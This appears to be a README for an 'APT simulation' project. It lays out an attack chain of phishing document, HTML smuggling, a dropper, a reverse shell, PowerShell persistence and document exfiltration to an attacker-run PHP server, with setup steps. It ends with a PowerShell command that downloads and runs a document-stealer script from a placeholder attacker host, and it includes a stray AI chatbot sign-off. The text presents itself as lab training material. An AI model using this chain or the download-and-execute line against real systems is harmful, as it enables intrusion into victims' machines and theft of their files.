# APT Simulation - Advanced Persistent Threat Attack

This project simulates an **Advanced Persistent Threat (APT)** attack, covering multiple stages from initial phishing to data exfiltration. The simulation is designed for educational and cybersecurity awareness purposes in a **controlled environment** such as VirtualBox.

## **Stages of the Attack**

### **1. Phishing (Initial Access)**

- A malicious **job description document (.docx)** is sent to the target.
- The document contains a **link to an HTML Smuggling page** that automatically downloads the initial dropper (**dropper.exe**).

### **2. HTML Smuggling (Dropper Execution)**

- When the target opens the link, **dropper.exe** is downloaded without triggering security warnings.
- If the user executes **dropper.exe**, it downloads additional payloads from the attacker's server.

### **3. Payload Deployment (Execution & Persistence)**

- The dropper downloads **shellcode (reverse shell)** from the attacker's server.
- A **PowerShell script** is executed to establish **persistence** via **Hijacking File Associations**.

### **4. Data Exfiltration (Document Theft)**

- A **PowerShell document stealer** searches for sensitive files (**.txt, .pdf, .xlsx, .csv**).
- Stolen files are uploaded to a **remote PHP web server** controlled by the attacker.

## **Components**

- **Dropper (C)**: Downloads & executes payloads.
- **Reverse Shell (C & Windows API)**: Establishes attacker connection.
- **PowerShell Scripts**: Handles persistence & document exfiltration.
- **PHP Web Server**: Receives stolen files.
- **HTML Smuggling (HTML & JavaScript)**: Bypasses browser security controls.
- **Phishing Document (DOCX)**: Social engineering bait.

## **How to Set Up the Simulation**

### **1. Configure Virtual Environment**

- Use **VirtualBox** with a **Windows VM** as the target.
- Set up an **attacker machine (Kali Linux/Ubuntu)** for control.

### **2. Start the Web Server**

```bash
php -S 0.0.0.0:8080 -t /path/to/upload_server/
```

### **3. Send the Phishing Document**

- Distribute the **malicious job description (.docx)** via email or messaging platforms.

### **4. Monitor the Attack Progress**

- Wait for the victim to execute **dropper.exe**.
- Capture the **reverse shell connection**.
- Extract stolen data from the PHP web server.

## **Disclaimer**

This project is strictly for **educational purposes**. Unauthorized use of these techniques on real systems **without permission** is illegal and may result in serious legal consequences. Use this simulation in a controlled and isolated environment only.

---

Let me know if you need **further refinements or additional details!** 🔥

powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://attacker_ip/docs-stealer.ps1')"
